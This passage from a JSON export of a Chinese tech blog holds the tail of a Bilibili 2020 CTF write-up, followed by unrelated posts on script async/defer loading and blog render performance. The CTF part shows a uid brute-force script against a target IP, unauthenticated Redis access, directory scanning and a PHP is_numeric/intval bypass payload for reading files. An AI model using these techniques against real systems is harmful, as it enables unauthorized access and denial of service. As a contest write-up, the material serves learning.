res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 